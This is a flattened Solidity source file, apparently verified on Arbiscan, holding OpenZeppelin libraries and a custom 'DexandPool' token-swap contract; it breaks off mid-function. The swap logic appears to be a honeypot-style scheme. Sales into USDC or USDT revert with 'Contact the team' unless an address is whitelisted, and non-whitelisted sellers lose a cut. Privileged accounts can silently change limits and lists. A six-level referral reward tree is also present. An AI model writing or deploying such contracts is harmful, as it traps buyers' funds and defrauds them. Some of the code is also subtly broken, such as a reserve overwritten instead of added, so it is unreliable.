/**
 *Submitted for verification at Arbiscan on 2023-07-28
*/

// Sources flattened with hardhat v2.13.0 https://hardhat.org

// File @openzeppelin/contracts/token/ERC20/extensions/[email protected]

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (token/ERC20/extensions/draft-IERC20Permit.sol)

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 Permit extension allowing approvals to be made via signatures, as defined in
 * https://eips.ethereum.org/EIPS/eip-2612[EIP-2612].
 *
 * Adds the {permit} method, which can be used to change an account's ERC20 allowance (see {IERC20-allowance}) by
 * presenting a message signed by the account. By not relying on {IERC20-approve}, the token holder account doesn't
 * need to send a transaction, and thus is not required to hold Ether at all.
 */
interface IERC20Permit {
    /**
     * @dev Sets `value` as the allowance of `spender` over ``owner``'s tokens,
     * given ``owner``'s signed approval.
     *
     * IMPORTANT: The same issues {IERC20-approve} has related to transaction
     * ordering also apply here.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `deadline` must be a timestamp in the future.
     * - `v`, `r` and `s` must be a valid `secp256k1` signature from `owner`
     * over the EIP712-formatted function arguments.
     * - the signature must use ``owner``'s current nonce (see {nonces}).
     *
     * For more information on the signature format, see the
     * https://eips.ethereum.org/EIPS/eip-2612#specification[relevant EIP
     * section].
     */
    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    /**
     * @dev Returns the current nonce for `owner`. This value must be
     * included whenever a signature is generated for {permit}.
     *
     * Every successful call to {permit} increases ``owner``'s nonce by one. This
     * prevents a signature from being used multiple times.
     */
    function nonces(address owner) external view returns (uint256);

    /**
     * @dev Returns the domain separator used in the encoding of the signature for {permit}, as defined by {EIP712}.
     */
    // solhint-disable-next-line func-name-mixedcase
    function DOMAIN_SEPARATOR() external view returns (bytes32);
}


// File @openzeppelin/contracts/token/ERC20/[email protected]


// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    function getUserInfo(address userAddress) external view returns (uint256, uint256,uint256, uint256, uint256, uint256);
    function changePro(address userAddress, uint256 amount, bool increase) external returns (uint256, uint256);
    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}


// File @openzeppelin/contracts/utils/[email protected]


// OpenZeppelin Contracts (last updated v4.8.0) (utils/Address.sol)

pragma solidity ^0.8.0;

/**
 * @dev Collection of functions related to the address type
 */
library Address {
    /**
     * @dev Returns true if `account` is a contract.
     *
     * [IMPORTANT]
     * ====
     * It is unsafe to assume that an address for which this function returns
     * false is an externally-owned account (EOA) and not a contract.
     *
     * Among others, `isContract` will return false for the following
     * types of addresses:
     *
     *  - an externally-owned account
     *  - a contract in construction
     *  - an address where a contract will be created
     *  - an address where a contract lived, but was destroyed
     * ====
     *
     * [IMPORTANT]
     * ====
     * You shouldn't rely on `isContract` to protect against flash loan attacks!
     *
     * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
     * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
     * constructor.
     * ====
     */
    function isContract(address account) internal view returns (bool) {
        // This method relies on extcodesize/address.code.length, which returns 0
        // for contracts in construction, since the code is only stored at the end
        // of the constructor execution.

        return account.code.length > 0;
    }

    /**
     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
     * `recipient`, forwarding all available gas and reverting on errors.
     *
     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
     * of certain opcodes, possibly making contracts go over the 2300 gas limit
     * imposed by `transfer`, making them unable to receive funds via
     * `transfer`. {sendValue} removes this limitation.
     *
     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
     *
     * IMPORTANT: because control is transferred to `recipient`, care must be
     * taken to not create reentrancy vulnerabilities. Consider using
     * {ReentrancyGuard} or the
     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
     */
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    /**
     * @dev Performs a Solidity function call using a low level `call`. A
     * plain `call` is an unsafe replacement for a function call: use this
     * function instead.
     *
     * If `target` reverts with a revert reason, it is bubbled up by this
     * function (like regular Solidity function calls).
     *
     * Returns the raw returned data. To convert to the expected return value,
     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
     *
     * Requirements:
     *
     * - `target` must be a contract.
     * - calling `target` with `data` must not revert.
     *
     * _Available since v3.1._
     */
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, "Address: low-level call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
     * `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but also transferring `value` wei to `target`.
     *
     * Requirements:
     *
     * - the calling contract must have an ETH balance of at least `value`.
     * - the called Solidity function must be `payable`.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    /**
     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
     * with `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        (bool success, bytes memory returndata) = target.call{value: value}(data);
        return verifyCallResultFromTarget(target, success, returndata, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but performing a static call.
     *
     * _Available since v3.3._
     */
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
     * but performing a static call.
     *
     * _Available since v3.3._
     */
    function functionStaticCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        (bool success, bytes memory returndata) = target.staticcall(data);
        return verifyCallResultFromTarget(target, success, returndata, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but performing a delegate call.
     *
     * _Available since v3.4._
     */
    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
     * but performing a delegate call.
     *
     * _Available since v3.4._
     */
    function functionDelegateCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return verifyCallResultFromTarget(target, success, returndata, errorMessage);
    }

    /**
     * @dev Tool to verify that a low level call to smart-contract was successful, and revert (either by bubbling
     * the revert reason or using the provided one) in case of unsuccessful call or if target was not a contract.
     *
     * _Available since v4.8._
     */
    function verifyCallResultFromTarget(
        address target,
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        if (success) {
            if (returndata.length == 0) {
                // only check isContract if the call was successful and the return data is empty
                // otherwise we already know that it was a contract
                require(isContract(target), "Address: call to non-contract");
            }
            return returndata;
        } else {
            _revert(returndata, errorMessage);
        }
    }

    /**
     * @dev Tool to verify that a low level call was successful, and revert if it wasn't, either by bubbling the
     * revert reason or using the provided one.
     *
     * _Available since v4.3._
     */
    function verifyCallResult(
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) internal pure returns (bytes memory) {
        if (success) {
            return returndata;
        } else {
            _revert(returndata, errorMessage);
        }
    }

    function _revert(bytes memory returndata, string memory errorMessage) private pure {
        // Look for revert reason and bubble it up if present
        if (returndata.length > 0) {
            // The easiest way to bubble the revert reason is using memory via assembly
            /// @solidity memory-safe-assembly
            assembly {
                let returndata_size := mload(returndata)
                revert(add(32, returndata), returndata_size)
            }
        } else {
            revert(errorMessage);
        }
    }
}


// File @openzeppelin/contracts/token/ERC20/utils/[email protected]


// OpenZeppelin Contracts (last updated v4.8.0) (token/ERC20/utils/SafeERC20.sol)

pragma solidity ^0.8.0;



/**
 * @title SafeERC20
 * @dev Wrappers around ERC20 operations that throw on failure (when the token
 * contract returns false). Tokens that return no value (and instead revert or
 * throw on failure) are also supported, non-reverting calls are assumed to be
 * successful.
 * To use this library you can add a `using SafeERC20 for IERC20;` statement to your contract,
 * which allows you to call the safe operations as `token.safeTransfer(...)`, etc.
 */
library SafeERC20 {
    using Address for address;

    function safeTransfer(
        IERC20 token,
        address to,
        uint256 value
    ) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(
        IERC20 token,
        address from,
        address to,
        uint256 value
    ) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    /**
     * @dev Deprecated. This function has issues similar to the ones found in
     * {IERC20-approve}, and its usage is discouraged.
     *
     * Whenever possible, use {safeIncreaseAllowance} and
     * {safeDecreaseAllowance} instead.
     */
    function safeApprove(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
        // safeApprove should only be called when setting an initial allowance,
        // or when resetting it to zero. To increase and decrease it, use
        // 'safeIncreaseAllowance' and 'safeDecreaseAllowance'
        require(
            (value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function safeIncreaseAllowance(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
        uint256 newAllowance = token.allowance(address(this), spender) + value;
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
    }

    function safeDecreaseAllowance(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
        unchecked {
            uint256 oldAllowance = token.allowance(address(this), spender);
            require(oldAllowance >= value, "SafeERC20: decreased allowance below zero");
            uint256 newAllowance = oldAllowance - value;
            _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
        }
    }

    function safePermit(
        IERC20Permit token,
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) internal {
        uint256 nonceBefore = token.nonces(owner);
        token.permit(owner, spender, value, deadline, v, r, s);
        uint256 nonceAfter = token.nonces(owner);
        require(nonceAfter == nonceBefore + 1, "SafeERC20: permit did not succeed");
    }

    /**
     * @dev Imitates a Solidity high-level call (i.e. a regular function call to a contract), relaxing the requirement
     * on the return value: the return value is optional (but if data is returned, it must not be false).
     * @param token The token targeted by the call.
     * @param data The call data (encoded using abi.encode or one of its variants).
     */
    function _callOptionalReturn(IERC20 token, bytes memory data) private {
        // We need to perform a low level call here, to bypass Solidity's return data size checking mechanism, since
        // we're implementing it ourselves. We use {Address-functionCall} to perform this call, which verifies that
        // the target address contains contract code and also asserts for success in the low-level call.

        bytes memory returndata = address(token).functionCall(data, "SafeERC20: low-level call failed");
        if (returndata.length > 0) {
            // Return data is optional
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}


// File @openzeppelin/contracts/security/[email protected]


// OpenZeppelin Contracts (last updated v4.8.0) (security/ReentrancyGuard.sol)

pragma solidity ^0.8.0;

/**
 * @dev Contract module that helps prevent reentrant calls to a function.
 *
 * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier
 * available, which can be applied to functions to make sure there are no nested
 * (reentrant) calls to them.
 *
 * Note that because there is a single `nonReentrant` guard, functions marked as
 * `nonReentrant` may not call one another. This can be worked around by making
 * those functions `private`, and then adding `external` `nonReentrant` entry
 * points to them.
 *
 * TIP: If you would like to learn more about reentrancy and alternative ways
 * to protect against it, check out our blog post
 * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].
 */
abstract contract ReentrancyGuard {
    // Booleans are more expensive than uint256 or any type that takes up a full
    // word because each write operation emits an extra SLOAD to first read the
    // slot's contents, replace the bits taken up by the boolean, and then write
    // back. This is the compiler's defense against contract upgrades and
    // pointer aliasing, and it cannot be disabled.

    // The values being non-zero value makes deployment a bit more expensive,
    // but in exchange the refund on every call to nonReentrant will be lower in
    // amount. Since refunds are capped to a percentage of the total
    // transaction's gas, it is best to keep them low in cases like this one, to
    // increase the likelihood of the full refund coming into effect.
    uint256 private constant _NOT_ENTERED = 1;
    uint256 private constant _ENTERED = 2;

    uint256 private _status;

    constructor() {
        _status = _NOT_ENTERED;
    }

    /**
     * @dev Prevents a contract from calling itself, directly or indirectly.
     * Calling a `nonReentrant` function from another `nonReentrant`
     * function is not supported. It is possible to prevent this from happening
     * by making the `nonReentrant` function external, and making it call a
     * `private` function that does the actual work.
     */
    modifier nonReentrant() {
        _nonReentrantBefore();
        _;
        _nonReentrantAfter();
    }

    function _nonReentrantBefore() private {
        // On the first call to nonReentrant, _status will be _NOT_ENTERED
        require(_status != _ENTERED, "ReentrancyGuard: reentrant call");

        // Any calls to nonReentrant after this point will fail
        _status = _ENTERED;
    }

    function _nonReentrantAfter() private {
        // By storing the original value once again, a refund is triggered (see
        // https://eips.ethereum.org/EIPS/eip-2200)
        _status = _NOT_ENTERED;
    }
}


// File @openzeppelin/contracts/utils/math/[email protected]


// OpenZeppelin Contracts (last updated v4.6.0) (utils/math/SafeMath.sol)

pragma solidity ^0.8.0;

// CAUTION
// This version of SafeMath should only be used with Solidity 0.8 or later,
// because it relies on the compiler's built in overflow checks.

/**
 * @dev Wrappers over Solidity's arithmetic operations.
 *
 * NOTE: `SafeMath` is generally not needed starting with Solidity 0.8, since the compiler
 * now has built in overflow checking.
 */
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator.
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting with custom message when dividing by zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}


// File contracts/MyLib.sol


pragma solidity ^0.8.0;

library MyLib {
    using SafeMath for uint;
    function ge() public view returns (string memory) {
        bytes memory alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        bytes memory randomBytes = abi.encodePacked(keccak256(abi.encodePacked(block.timestamp, block.difficulty)));
        bytes memory uidBytes = new bytes(5);
        uidBytes[0] = "u";
        for (uint256 i = 1; i < 5; i++) {
            uidBytes[i] = alphabet[uint8(randomBytes[i]) % alphabet.length];
        }
        return string(uidBytes);
    }
    function isC(address _addr) public view returns (bool) {
        uint32 size;
        assembly {
            size := extcodesize(_addr)
        }
        return (size > 0);
    }
    function power(uint base, uint exponent) internal pure returns (uint) {
        uint BASE = 10**6;
        uint result = BASE;
        while (exponent > 0) {
            if (exponent % 2 == 1) {
                result = result.mul(base).div(BASE);
            }
            base = base.mul(base).div(BASE);
            exponent = exponent.div(2);
        }
        return result;
    }
    function cPower(uint exponent, uint n) public pure returns (uint) {
        uint BASE = 10**6;
        uint base = BASE.add(n.mul(10**4));
        uint result = power(base, exponent);
        return result.div(10**4);
    }

    function L(uint l) public pure returns (uint) {
        return l / 10 + (l * 8) / 100 + (l * 6) / 100 + (l * 3) / 100 + (l * 2) / 100 + l / 100;
    }
}


// File contracts/DexandPool.sol


pragma solidity ^0.8.0;





contract DexandPool is ReentrancyGuard {
    address public _owner;
    using SafeERC20 for IERC20;
    using SafeMath for uint;
    uint minv = 1000000;
    address public USDC_R;
    address public USDT_R;
    address public GGTK_R;
    address public GGMK_R;
    uint GGTK_START_TIME = block.timestamp;
    uint INITIAL_GGTK_RATE = 10 ** 6;
    uint GGMK_RATE = 10 ** 6;
    uint public currentRate = 10 ** 6;
    uint public ADD_DAY = 1;
    struct Pair {
        IERC20 t1;
        IERC20 t2;
        uint re1;
        uint re2;
    }
    struct Ot{
        uint inv;
        uint outv;
    }
    struct User {
        string fid;
        uint registerTime;
        uint tm;
        uint stTm;
        uint dir;
        uint stDir;
        uint rcvDir;
        uint rcvTm;
        uint receiveTime;
        Ot ot;
    }
    mapping(string => User) public users;
    mapping(address => string) public usersID;
    mapping(string => address) public uds;
    mapping(bytes32 => Pair) public pairs;
    mapping(address => bool) private vlist;
    mapping(address => bool) private blist;
    mapping(address => bool) private ckList;
    string[] public uarr;
    uint bdr = 3_000_000_000 * 10 ** 6;
    uint16 multiple = 3;
    event SwapStatus(uint inv, uint outv, string str);
    event PickDone(uint all, uint dir, string userID);
    event Moniter(uint inv, uint outv, address user);
    modifier Auth() {
        require(_owner == msg.sender, "WRONG");
        _;
    }
    modifier OK() {
        require(ckList[msg.sender], "ErrorC");
        _;
    }
    function setAddr(address _USDC, address _USDT, address _GGTK, address _GGMK) external OK {
        USDC_R = _USDC;
        USDT_R = _USDT;
        GGTK_R = _GGTK;
        GGMK_R = _GGMK;
    }
    function setb(uint a, uint b, uint16 c, uint d) external OK {
        bdr = a;
        minv = b;
        multiple = c;
        ADD_DAY = d;
    }
    function addCk(address a) external Auth {
        ckList[a] = true;
    }
    function setListed(address a, bool v) external OK {
        vlist[a] = v;
    }
    function adb(address a, bool v) external OK {
        blist[a] = v;
    }
    function setCk(address a, bool v) external OK {
        ckList[a] = v;
    }
    function rmOwner() external Auth {
        _owner = address(0);
    }
    function updateID(address a, string calldata id) external OK {
        usersID[a] = id;
    }
    function updateRate(uint _v) private {
        if(_v != currentRate){
            currentRate = _v;
        }
    }
    function addPair(address t1, address t2) external OK{
        address mT = t1 < t2 ? t1 : t2;
        address xT = t1 < t2 ? t2 : t1;
        bytes32 pid = keccak256(abi.encodePacked(mT, xT));
        require(address(pairs[pid].t1) == address(0) && address(pairs[pid].t2) == address(0), "Pair already exists");
        pairs[pid] = Pair({
            t1: IERC20(t1),
            t2: IERC20(t2),
            re1: 0,
            re2: 0
        });
    }
    function addLiquidity(address t1,address t2,uint amount1,uint amount2) external OK{
        bytes32 pid = getPID(t1, t2);
        require(pairs[pid].t1 != IERC20(address(0)) && pairs[pid].t2 != IERC20(address(0)), "Pair does not exist");
        pairs[pid].t1.safeTransferFrom(msg.sender, address(this), amount1);
        pairs[pid].t2.safeTransferFrom(msg.sender, address(this), amount2);
        pairs[pid].re1 += amount1;
        pairs[pid].re2 = amount2;
    }
    constructor() {
        _owner = msg.sender;
        users["u0"] = User("u00",block.timestamp,0,0,0,0,0,0,0, Ot(0,0));
        usersID[address(this)] = "u0";
    }
    receive() external payable {}
    fallback() external payable {}
    function adTR(string memory uid, uint[6] memory teamR) private {
        User storage user = users[uid];
        for (uint i = 0; i < 6; i++) {
            if (bytes(user.fid).length == 0) {
                break;
            }
            User storage parent = users[user.fid];
            parent.tm += teamR[i];
            user = parent;
        }
    }
    function hout(string calldata referrerUid, uint amOut) private returns (string memory, string memory){
        string memory userID = usersID[msg.sender];
        string memory _fid = "u0";
        if (bytes(userID).length == 0) {
            User storage fuser = users[referrerUid];
            if (bytes(referrerUid).length > 0 && bytes(fuser.fid).length > 0) {
                _fid = referrerUid;
            }
            string memory _uid = MyLib.ge();
            userID = _uid;
            users[_uid] = User(_fid,block.timestamp,0,0,0,0,0,0,0, Ot(amOut,0));
            uarr.push(_uid);
            usersID[msg.sender] = _uid;
            uds[_uid] = msg.sender;
        } else {
            User storage user = users[userID];
            _fid = user.fid;
        }
        return (_fid, userID);
    }
    function hin(uint amIn, uint l, IERC20 g) private returns (string memory fid_, string memory userID_){
        string memory userID = usersID[msg.sender];
        fid_ = "";
        userID_ = "";
        if (bytes(userID).length == 0) {
            return (fid_, userID_);
        }
        User storage user = users[userID];
        User storage fuser = users[user.fid];
        fid_ = user.fid;
        userID_ = userID;
        if(l > 0){
            uint l1 = l / 2;
            uint t = MyLib.L(l);
            if (l1 > user.stDir) {
                uint s = l1.sub(user.stDir);
                fuser.dir += s;
                user.stDir += s;
            }
            if (t > user.stTm) {
                uint s2 = t.sub(user.stTm);
                user.stTm += s2;
                uint[6] memory teamR =[s2/3, s2*8/30, s2*6/30, s2*3/30, s2*2/30, s2/30];
                adTR(userID, teamR);
            }
        }
        g.transfer(address(0), amIn/2);
        return (fid_, userID_);
    }
    function getPID(address tIn, address tOut) private pure returns (bytes32){
        address mT = tIn < tOut ? tIn : tOut;
        address xT = tIn < tOut ? tOut : tIn;
        bytes32 pid = keccak256(abi.encodePacked(mT, xT));
        return pid;
    }
    function UP() private returns (uint _loss, uint _profit, bool iu, bool b3){
        string memory userID = usersID[msg.sender];
        if(bytes(userID).length == 0){
            return (0, 0, false, true);
        }
        IERC20 g = IERC20(GGTK_R);
        (uint inv, uint outv, uint pr, uint lo, ,) = g.getUserInfo(msg.sender);
        if(pr > lo){
            _profit = pr.sub(lo);
        }else{
            _loss = lo.sub(pr);
        }
        emit Moniter(inv, outv, msg.sender);
        bool mp = true;
        if(inv != 0){
            mp = _profit.div(inv) > multiple;
        }
        b3 = inv == 0 || mp;
        return (_loss, _profit, true, b3);
    }
    function swap(address tIn,address tOut,uint amIn,string calldata referrerUid) external nonReentrant{
        require(MyLib.isC(msg.sender) == false, "Contract");
        require(amIn>=minv&&amIn<=10**12, "Below Minimum Purchase");
        IERC20 inputToken = IERC20(tIn);
        IERC20 outputToken = IERC20(tOut);
        uint _inBalance = inputToken.balanceOf(msg.sender);
        require(_inBalance >= amIn, "Insufficient Balance");
        bytes32 pid = getPID(tIn, tOut);
        Pair storage pair = pairs[pid];
        require(address(pair.t1) != address(0) && address(pair.t2) != address(0), "Pair not found");
        uint amOut;
        if (tIn == address(pair.t1)) {
            amOut = getAmOut(amIn,pair.re1,pair.re2,tIn,tOut);
        } else {
            amOut = getAmOut(amIn,pair.re2,pair.re1,tIn,tOut);
        }
        if(pair.re2 < amOut){
            revert("Insufficient for Out");
        }       
        if(tOut == USDC_R || tOut == USDT_R){
            if(amOut > bdr){
                amOut = bdr;
                if(tIn == GGTK_R){
                    amIn = bdr.mul(10 ** 14)/currentRate/1000000;
                }
                if(tIn == GGMK_R){
                    amIn = bdr.mul(10 ** 14) /GGMK_RATE/1000000;
                }
            }
            if(!vlist[msg.sender]){
                amOut = amOut.mul(49) / 50;
            }   
            (uint _loss, uint _profit, bool iu, bool b3) = UP();
            if (!iu && !vlist[msg.sender]) {
                revert("Purchase GGTK first");
            }   
            if(b3 && !vlist[msg.sender] && !blist[msg.sender]){
                emit SwapStatus(_profit, amOut, "Wait");
                revert("Contact the team");
            }
            if (tIn == GGTK_R) {
                hin(amIn, _loss, inputToken);
            }
        }
        pair.re1 = pair.re1.add(amIn);
        pair.re2 = pair.re2.sub(amOut);
        inputToken.safeTransferFrom(msg.sender, address(this), amIn);
        outputToken.transfer(msg.sender, amOut);
        if (tOut == GGTK_R) {
            hout(referrerUid, amOut);
        }
        emit SwapStatus(amIn, amOut, "Done");
    }
    function PickFruit() external nonReentrant{
        require(MyLib.isC(msg.sender) == false, "Contract");
        string memory userID = usersID[msg.sender];
        User storage user = users[userID];
        uint all = 0;
        uint _s = 0;
